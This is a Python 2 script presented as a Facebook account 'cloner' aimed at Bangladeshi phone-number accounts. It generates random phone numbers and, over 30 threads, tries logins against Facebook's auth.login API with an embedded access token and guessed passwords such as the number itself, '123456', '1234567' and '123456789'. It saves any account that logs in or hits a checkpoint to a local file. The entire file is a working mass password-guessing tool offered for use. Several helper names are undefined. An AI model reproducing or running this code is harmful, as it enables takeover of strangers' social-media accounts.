#!/usr/bin/python 

#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')

for n in range(10000):

    nmbr = random.randint(1111111,9999999)

    sys.stdout = open('.txt', 'a')

    print nmbr

    sys.stdout.flush()

    

try:

    import requests

except ImportError:

    os.system('pip2 install mechanize')

try:

    import mechanize

except ImportError:

    os.system('pip2 install request')

    time.sleep(1)

    os.system('Then type: python2 clone.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]')]

br.addheaders = [('User-Agent', 'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011;]')]

br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]')]

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(3.0 / 200)

def tik():

    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']

    for o in titik:

        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;97mWait A Few Moments \x1b[1;97m' + o,

        sys.stdout.flush()

        time.sleep(0.5)

back = 0

oks = []

id = []

cpb = []

vulnot = '\x1b[31mNot Vuln'

vuln = '\x1b[32mVuln'

os.system('xdg-open https://www.facebook.com/hunterboy619')

os.system('clear')

logo2 =("""

   __ __          __            __               ______           _     

  / // /_ _____  / /____ ____  / /  ___  __ __  /_  __/__ ___ _  (_)_ _ 

 / _  / // / _ \/ __/ -_) __/ / _ \/ _ \/ // /   / / / _ `/  ' \/ /  ' \

/_//_/\_,_/_//_/\__/\__/_/   /_.__/\___/\_, /   /_/  \_,_/_/_/_/_/_/_/_/

                                       /___/                                  

""")

os.system('clear')

print logo2

print 48 * '\x1b[1;91m~'

def login():

    os.system('clear')

    print logo2

    print 48 * '\x1b[1;91m~'

    

    print 48 * '\x1b[1;91m~'

    print '\x1b[1;91m[\x1b[1;91m1\x1b[1;91m]\x1b[1;92m START NORMAL CRACK FAST [BD ID]'

    print '\x1b[1;91m[\x1b[1;91m2\x1b[1;91m]\x1b[1;92m START OLD CRACK SLOW [BD ID]'

    print '\x1b[1;91m[\x1b[1;91m0\x1b[1;91m]\x1b[1;92m BACK'

    print 48 * '\x1b[1;91m~'

    pilih_Ariyan()

def pilih_Ariyan():

    Ariyan = raw_input('\n\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\33[93m CHOOSE  : ')

    if Ariyan == '':

        print '\x1b[1;97mFill In Correctly'

        pilih_login()

    elif Ariyan == '1':

        p()

    elif Ariyan == '2':

        b()

def p():

    os.system('clear')

    print logo2

    print 48 * '\x1b[1;91m~'

    print '\x1b[1;91mChoose:(01) Do you want countinue [y/n]'

    print 48 * '\x1b[1;91m~'

    act()

def act():

    Ariyan = raw_input('\n\x1b[1;91m[\x1b[1;91m*\x1b[1;91m]\33[93m CHOOSE : ')

    if Ariyan == '':

        print '[!] Fill in correctly'

        act()

    elif Ariyan == 'y':

        tik()

        os.system('clear')

        print logo2

        print 42 * '\x1b[1;91m~'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;91m FACEBOOK BD NUMBER ACCOUNT CLONER \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]'

        print 42 * '\x1b[1;91m~'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\33[93m TYPE 2 DIGIT ANY CODE             \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 31,32,33,34,35\x1b[1;92m[\x1b[1;92m*\x1b[1;92m]\x1b[1;92m71,72,73,75      \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 41,42,43,44,45\x1b[1;92m[\x1b[1;92m*\x1b[1;92m]\x1b[1;92m91,92,93,95      \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 61,62,63,64,65,66,67,68,69,70     \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 71,72,73,74,75,76,77,78,79,80     \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 81,82,83,84,85,86,87,88,89,90     \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print 42 * '\x1b[1;91m~'

        try:

            c = raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\33[93m CHOOSE : ')

            k = '01'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\n[ Back ]')

            Ariyan()

    elif somi == 'n':

        login()

    else:

        print '[!] Fill In Correctly'

        action()

    os.system('clear')

    print logo2

    print 48 * '\x1b[1;91m~'

    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92mBANGLADESH\x1b[1;92m FACEBOOK\x1b[1;92m NUMBER\x1b[1;92m ACCOUNT\x1b[1;92m CLONER\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]'

    xxx = str(len(id))

    print 48 * '\x1b[1;91m~'

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL \x1b[1;92mUID \x1b[1;92mNUMBER : ' + xxx)

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m UID \x1b[1;92mYOU \x1b[1;92mCHOOSE   : ' +k +c)

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m START \x1b[1;92mUID \x1b[1;92mACCOUNT \x1b[1;92mCRACKING...')

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m STOP \x1b[1;92mTHIS \x1b[1;92mPROSSES \x1b[1;92mCTRL+Z')

    print 48 * '\x1b[1;91m~'

    def main(arg):

        global cpb

        global oks

        user = arg

        try:

            os.mkdir('save')

        except OSError:

            pass

        try:

            pass1 = k + c + user

            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

            q = json.load(data)

            if 'access_token' in q:

                print '\x1b[1;92m[Hunter Tamim-OK]  \x1b[1;92m ' + k + c + user + '  |  ' + pass1

                okb = open('save/Ariyan.txt', 'a')

                okb.write(k + c + user + pass1 + '\n')

                okb.close()

                oks.append(c + user + pass1)

            elif 'www.facebook.com' in q['error_msg']:

                print '\33[93m[Hunter Tamim-CP]  \x1b[1;93m ' + k + c + user + '  |  ' + pass1

                cps = open('save/Ariyan.txt', 'a')

                cps.write(k + c + user + pass1 + '\n')

                cps.close()

                cpb.append(c + user + pass1)

            else:

                pass2 = user

                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                q = json.load(data)

                if 'access_token' in q:

                    print '\x1b[1;92m[Hunter Tamim-OK]  \x1b[1;92m ' + k + c + user + '  |  ' + pass2

                    okb = open('save/Ariyan.txt', 'a')

                    okb.write(k + c + user + pass2 + '\n')

                    okb.close()

                    oks.append(c + user + pass2)

                elif 'www.facebook.com' in q['error_msg']:

                    print '\33[93m[Hunter Tamim-CP]  \x1b[1;93m ' + k + c + user + '  |  ' + pass2

                    cps = open('save/Ariyan.txt', 'a')

                    cps.write(k + c + user + pass2 + '\n')

                    cps.close()

                    cpb.append(c + user + pass2)

                    

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print 50 * '\x1b[1;91m-'

    print 'Process Has Been Completed ...'

    print '\x1b[0;94mTotal \x1b[1;94mOK\x1b[1;94m/\x1b[1;94mCP : \x1b[1;94m' + str(len(oks)) + '\x1b[1;94m/\x1b[1;94m' + str(len(cpb))

    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;92m]')

    login()

def b():

    os.system('clear')

    print logo2

    print 48 * '\x1b[1;91m~'

    print '\x1b[1;92mChoose:(02) Do you want countinue [y/n]'

    print 48 * '\x1b[1;91m~'

    action()

def action():

    Ariyan = raw_input('\n\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\33[93m CHOOSE : ')

    if Ariyan == '':

        print '[!] Fill in correctly'

        action()

    elif Ariyan == 'y':

        tik()

        os.system('clear')

        print logo2

        print 42 * '\x1b[1;91m~'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;91m FACEBOOK BD NUMBER ACCOUNT CLONER \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]'

        print 42 * '\x1b[1;91m~'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\33[93m TYPE 2 DIGIT ANY CODE             \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 31,32,33,34,35\x1b[1;92m[\x1b[1;92m*\x1b[1;92m]\x1b[1;92m71,72,73,75      \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 41,42,43,44,45\x1b[1;92m[\x1b[1;92m*\x1b[1;92m]\x1b[1;92m91,92,93,95      \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 61,62,63,64,65,66,67,68,69,70     \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 71,72,73,74,75,76,77,78,79,80     \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 81,82,83,84,85,86,87,88,89,90     \x1b[1;92m[\x1b[1;92m*\x1b[1;92m]'

        print 42 * '\x1b[1;91m~'

        try:

            c = raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE : ')

            k = '01'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\n[ Back ]')

            Ariyan()

    elif Ariyan == 'n':

        login()

    else:

        print '[!] Fill In Correctly'

        action()

    os.system('clear')

    print logo2

    print 48 * '\x1b[1;91m~'

    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92mBANGLADESH\x1b[1;92m FACEBOOK\x1b[1;92m NUMBER\x1b[1;92m ACCOUNT\x1b[1;92m CLONER\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]'

    xxx = str(len(id))

    print 48 * '\x1b[1;91m~'

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL \x1b[1;92mUID \x1b[1;92mNUMBER : ' + xxx)

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m UID \x1b[1;92mYOU \x1b[1;92mCHOOSE   : ' +k +c)

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m START \x1b[1;92mUID \x1b[1;92mACCOUNT \x1b[1;92mCRACKING...')

    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m STOP \x1b[1;92mTHIS \x1b[1;92mPROSSES \x1b[1;92mCTRL+Z')

    print 48 * '\x1b[1;91m~'

    def main(arg):

        user = arg

        try:

            os.mkdir('save')

        except OSError:

            pass

        try:

            pass1 = '123456'

            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

            q = json.load(data)

            if 'access_token' in q:

                print '\x1b[1;92m[Hunter Tamim-OK]  \x1b[1;92m ' + k + c + user + '  |  ' + pass1

                okb = open('save/Ariyan.txt', 'a')

                okb.write(k + c + user + pass1 + '\n')

                okb.close()

                oks.append(c + user + pass1)

            elif 'www.facebook.com' in q['error_msg']:

                print '\33[93m[Hunter Tamim-CP]  \x1b[1;93m ' + k + c + user + '  |  ' + pass1

                cps = open('save/Ariyan.txt', 'a')

                cps.write(k + c + user + pass1 + '\n')

                cps.close()

                cpb.append(c + user + pass1)

            else:

                pass2 = '1234567'

                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                q = json.load(data)

                if 'access_token' in q:

                    print '\x1b[1;92m[Hunter Tamim-OK]  \x1b[1;92m ' + k + c + user + '  |  ' + pass2

                    okb = open('save/Ariyan.txt', 'a')

                    okb.write(k + c + user + pass2 + '\n')

                    okb.close()

                    oks.append(c + user + pass2)

                elif 'www.facebook.com' in q['error_msg']:

                    print '\33[93m[Hunter Tamim-CP]  \x1b[1;93m ' + k + c + user + '  |  ' + pass2

                    cps = open('save/Ariyan.txt', 'a')

                    cps.write(k + c + user + pass2 + '\n')

                    cps.close()

                    cpb.append(c + user + pass2)

                else:

                    pass3 = '123456789'

                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                    q = json.load(data)

                    if 'access_token' in q:

                        print '\x1b[1;92m[Hunter Tamim-OK]  \x1b[1;92m ' + k + c + user + '  |  ' + pass3

                        okb = open('save/Ariyan.txt', 'a')

                        okb.write(k + c + user + pass3 + '\n')

                        okb.close()

                        oks.append(c + user + pass3)

                    elif 'www.facebook.com' in q['error_msg']:

                        print '\33[93m[Hunter Tamim-CP]  \x1b[1;93m ' + k + c + user + '  |  ' + pass3

                        cps = open('save/Ariyan.txt', 'a')

                        cps.write(k + c + user + pass3 + '\n')

                        cps.close()

                        cpb.append(c + user + pass3)

                

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print 50 * '\x1b[1;91m-'

    print 'Process Has Been Completed ...'

    print '\x1b[1;94mTotal \x1b[1;94mOK\x1b[1;94m/\x1b[1;94mCP : \x1b[1;94m' + str(len(oks)) + '\x1b[1;94m/\x1b[1;94m' + str(len(cpb))

    raw_input('\n\x1b[1;94m[\x1b[1;94mBack\x1b[1;94m]')

    login()

if __name__ == '__main__':

    login()

